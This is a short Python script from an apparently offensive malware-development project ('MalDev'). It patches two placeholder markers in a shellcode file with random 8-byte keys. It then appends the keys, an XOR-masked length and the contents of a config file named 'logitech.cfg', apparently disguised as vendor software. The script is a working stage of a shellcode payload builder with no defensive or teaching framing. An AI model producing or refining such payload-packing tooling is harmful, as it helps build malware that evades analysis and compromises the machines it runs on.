import random
import sys

final_path = sys.argv[1]
config_path = 'D:\\Documents\\source\\repos\\MalDev\\x64\\Debug\\logitech.cfg'
config_data = open(config_path, 'rb').read()

shellcode = open(final_path, 'rb').read()
key1 = random.randbytes(8)
key2 = random.randbytes(8)
for i in range(len(shellcode)):
    value = int.from_bytes(shellcode[i: i + 8], 'little')
    if value == 0x254b70d8fe6a904e:
        shellcode = shellcode[:i] + key1 + shellcode[i + 8:]
    elif value == 0x777733e22f9889c2:
        shellcode = shellcode[:i] + key2 + shellcode[i + 8:]
        break

shellcode = shellcode + key1 + (len(config_data) ^ int.from_bytes(key1) ^ int.from_bytes(key2)).to_bytes(8, 'little') + config_data
open(final_path, 'wb').write(shellcode)